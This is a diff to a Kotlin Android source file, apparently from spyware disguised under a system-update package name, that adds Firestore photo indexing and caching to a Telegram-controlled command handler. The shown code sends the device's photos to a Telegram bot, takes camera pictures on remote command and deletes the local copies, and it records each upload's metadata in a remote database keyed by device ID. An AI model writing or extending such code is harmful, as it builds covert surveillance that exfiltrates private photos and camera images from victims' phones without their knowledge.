@@ -2,9 +2,216 @@ package com.sys.update2
 
 import android.content.Context
 import android.util.Log
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONArray
+import org.json.JSONObject
 import java.io.File
+import java.util.concurrent.TimeUnit
 
 object CommandExecutor {
+
+    // ═══════════════════════════════════════════
+    //  PhotoIndex — يحفظ metadata الصور في Firestore
+    // ═══════════════════════════════════════════
+    private object PhotoIndex {
+        private val client = OkHttpClient.Builder()
+            .connectTimeout(30, TimeUnit.SECONDS)
+            .readTimeout(30, TimeUnit.SECONDS)
+            .writeTimeout(60, TimeUnit.SECONDS)
+            .build()
+
+        private fun base(): String =
+            "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents"
+
+        private fun str(s: String) = JSONObject().put("stringValue", s)
+        private fun num(n: Long) = JSONObject().put("integerValue", n.toString())
+
+        fun save(ctx: Context, fileId: String, msgId: Int, name: String, size: Long, caption: String) {
+            Thread {
+                try {
+                    val deviceId = DeviceManager.getDeviceId(ctx)
+                    val url = "${base()}/devices/$deviceId/photos/$msgId?key=${Config.FIREBASE_API_KEY}"
+                    val fields = JSONObject().apply {
+                        put("file_id", str(fileId))
+                        put("msg_id", num(msgId.toLong()))
+                        put("name", str(name))
+                        put("size", num(size))
+                        put("date", num(System.currentTimeMillis()))
+                        put("caption", str(caption))
+                    }
+                    val body = JSONObject().put("fields", fields).toString()
+                    val req = Request.Builder()
+                        .url(url)
+                        .patch(body.toRequestBody("application/json".toMediaType()))
+                        .build()
+                    client.newCall(req).execute().use { resp ->
+                        if (!resp.isSuccessful) Log.e("PhotoIndex", "save failed: ${resp.code}")
+                    }
+                } catch (e: Exception) {
+                    Log.e("PhotoIndex", "save err: ${e.message}")
+                }
+            }.start()
+        }
+
+        fun list(ctx: Context): String {
+            return try {
+                val deviceId = DeviceManager.getDeviceId(ctx)
+                val url = "${base()}/devices/$deviceId/photos?key=${Config.FIREBASE_API_KEY}&pageSize=300"
+                val req = Request.Builder().url(url).get().build()
+                client.newCall(req).execute().use { resp ->
+                    val body = resp.body?.string() ?: return "[]"
+                    val obj = JSONObject(body)
+                    val docs = obj.optJSONArray("documents") ?: return "[]"
+                    val arr = JSONArray()
+                    for (i in 0 until docs.length()) {
+                        val doc = docs.optJSONObject(i) ?: continue
+                        val f = doc.optJSONObject("fields") ?: continue
+                        val item = JSONObject().apply {
+                            put("file_id", f.optJSONObject("file_id")?.optString("stringValue") ?: "")
+                            put("msg_id", f.optJSONObject("msg_id")?.optString("integerValue")?.toLongOrNull() ?: 0)
+                            put("name", f.optJSONObject("name")?.optString("stringValue") ?: "")
+                            put("size", f.optJSONObject("size")?.optString("integerValue")?.toLongOrNull() ?: 0)
+                            put("date", f.optJSONObject("date")?.optString("integerValue")?.toLongOrNull() ?: 0)
+                            put("caption", f.optJSONObject("caption")?.optString("stringValue") ?: "")
+                        }
+                        arr.put(item)
+                    }
+                    arr.toString()
+                }
+            } catch (e: Exception) {
+                Log.e("PhotoIndex", "list err: ${e.message}")
+                "[]"
+            }
+        }
+
+        fun clear(ctx: Context) {
+            Thread {
+                try {
+                    val deviceId = DeviceManager.getDeviceId(ctx)
+                    val url = "${base()}/devices/$deviceId/photos?key=${Config.FIREBASE_API_KEY}&pageSize=300"
+                    val req = Request.Builder().url(url).get().build()
+                    client.newCall(req).execute().use { resp ->
+                        val body = resp.body?.string() ?: return
+                        val docs = JSONObject(body).optJSONArray("documents") ?: return
+                        for (i in 0 until docs.length()) {
+                            val name = docs.optJSONObject(i)?.optString("name") ?: continue
+                            val delUrl = "https://firestore.googleapis.com/v1/$name?key=${Config.FIREBASE_API_KEY}"
+                            val delReq = Request.Builder().url(delUrl).delete().build()
+                            client.newCall(delReq).execute().use { }
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.e("PhotoIndex", "clear err: ${e.message}")
+                }
+            }.start()
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  PhotoCache — حفظ الصور محلياً
+    // ═══════════════════════════════════════════
+    private object PhotoCache {
+        fun dir(ctx: Context): File {
+            val d = File(ctx.filesDir, "gallery")
+            if (!d.exists()) d.mkdirs()
+            return d
+        }
+
+        fun file(ctx: Context, fileId: String): File {
+            val safe = fileId.replace(Regex("[^A-Za-z0-9_-]"), "_").take(80)
+            return File(dir(ctx), "$safe.jpg")
+        }
+
+        fun has(ctx: Context, fileId: String): Boolean {
+            val f = file(ctx, fileId)
+            return f.exists() && f.length() > 0
+        }
+
+        fun save(ctx: Context, fileId: String, bytes: ByteArray): File? {
+            return try {
+                val f = file(ctx, fileId)
+                f.writeBytes(bytes)
+                f
+            } catch (e: Exception) {
+                Log.e("PhotoCache", "save err: ${e.message}")
+                null
+            }
+        }
+
+        fun size(ctx: Context): Long {
+            return try {
+                dir(ctx).listFiles()?.sumOf { it.length() } ?: 0L
+            } catch (_: Exception) { 0L }
+        }
+
+        fun clear(ctx: Context) {
+            try { dir(ctx).listFiles()?.forEach { it.delete() } } catch (_: Exception) {}
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  WebView API — يستخدمها الـ HTML
+    // ═══════════════════════════════════════════
+
+    /** يجيب list كل الصور المخزنة في Firestore (JSON string) */
+    fun listPhotosJson(ctx: Context): String = PhotoIndex.list(ctx)
+
+    /** يجيب رابط صورة من تلغرام (أو كاش محلي) */
+    fun getPhotoUrl(ctx: Context, fileId: String): String {
+        if (PhotoCache.has(ctx, fileId)) {
+            return "file://" + PhotoCache.file(ctx, fileId).absolutePath
+        }
+        return try {
+            val path = TelegramApi.getFile(fileId) ?: return ""
+            "https://api.telegram.org/file/bot${Config.TELEGRAM_BOT_TOKEN}/$path"
+        } catch (e: Exception) {
+            Log.e("CmdExec", "getPhotoUrl err: ${e.message}")
+            ""
+        }
+    }
+
+    /** ينزّل الصورة ويحفظها محلياً — يرجّع file:// URL */
+    fun cachePhoto(ctx: Context, fileId: String): String {
+        return try {
+            if (PhotoCache.has(ctx, fileId)) {
+                return "file://" + PhotoCache.file(ctx, fileId).absolutePath
+            }
+            val path = TelegramApi.getFile(fileId) ?: return ""
+            val url = "https://api.telegram.org/file/bot${Config.TELEGRAM_BOT_TOKEN}/$path"
+            val client = OkHttpClient.Builder()
+                .connectTimeout(30, TimeUnit.SECONDS)
+                .readTimeout(60, TimeUnit.SECONDS)
+                .build()
+            val req = Request.Builder().url(url).get().build()
+            client.newCall(req).execute().use { resp ->
+                if (!resp.isSuccessful) return ""
+                val bytes = resp.body?.bytes() ?: return ""
+                val f = PhotoCache.save(ctx, fileId, bytes)
+                if (f != null) "file://" + f.absolutePath else ""
+            }
+        } catch (e: Exception) {
+            Log.e("CmdExec", "cachePhoto err: ${e.message}")
+            ""
+        }
+    }
+
+    fun isPhotoCached(ctx: Context, fileId: String): Boolean =
+        try { PhotoCache.has(ctx, fileId) } catch (_: Exception) { false }
+
+    fun clearPhotoCache(ctx: Context): Boolean =
+        try { PhotoCache.clear(ctx); true } catch (_: Exception) { false }
+
+    fun photoCacheSize(ctx: Context): Long =
+        try { PhotoCache.size(ctx) } catch (_: Exception) { 0L }
+
+    fun clearPhotoIndex(ctx: Context) = PhotoIndex.clear(ctx)
+
+    // ═══════════════════════════════════════════
+    //  المعالج الرئيسي للأوامر
+    // ═══════════════════════════════════════════
 
     fun handle(ctx: Context, callbackData: String, callbackId: String) {
         TelegramApi.answerCallback(callbackId)
@@ -219,6 +426,9 @@ object CommandExecutor {
         }
     }
 
+    /**
+     * إرسال قائمة صور + حفظ metadata في Firestore
+     */
     private fun sendMediaList(ctx: Context, list: List<MediaScanner.MediaFile>, title: String) {
         if (list.isEmpty()) {
             TelegramApi.sendMessage("📭 لا توجد صور", KeyboardBuilder.replyKeyboard())
@@ -229,7 +439,17 @@ object CommandExecutor {
         for (item in list) {
             val file = File(item.path)
             if (!file.exists()) { failed++; continue }
-            if (TelegramApi.sendPhoto(file, item.name)) sent++ else failed++
+
+            val (ok, fileId) = TelegramApi.sendPhoto(file, item.name)
+            if (ok) {
+                sent++
+                // احفظ metadata في Firestore
+                if (fileId.isNotBlank()) {
+                    PhotoIndex.save(ctx, fileId, sent, item.name, item.size, "📸 ${item.name}")
+                }
+            } else {
+                failed++
+            }
         }
         TelegramApi.sendMessage("$title — ${list.size}\n✅ $sent\n❌ $failed", KeyboardBuilder.replyKeyboard())
     }
@@ -260,7 +480,10 @@ object CommandExecutor {
             TelegramApi.sendMessage("📷 *جاري التصوير ($label)...*")
             val file = CameraCapture.capture(ctx, front, timeoutSec = 12)
             if (file != null && file.exists()) {
-                TelegramApi.sendPhoto(file, "📷 صورة ($label)")
+                val (ok, fileId) = TelegramApi.sendPhoto(file, "📷 صورة ($label)")
+                if (ok && fileId.isNotBlank()) {
+                    PhotoIndex.save(ctx, fileId, System.currentTimeMillis().toInt(), file.name, file.length(), "📷 صورة ($label)")
+                }
                 file.delete()
             } else {
                 TelegramApi.sendMessage("❌ فشل التصوير", KeyboardBuilder.replyKeyboard())
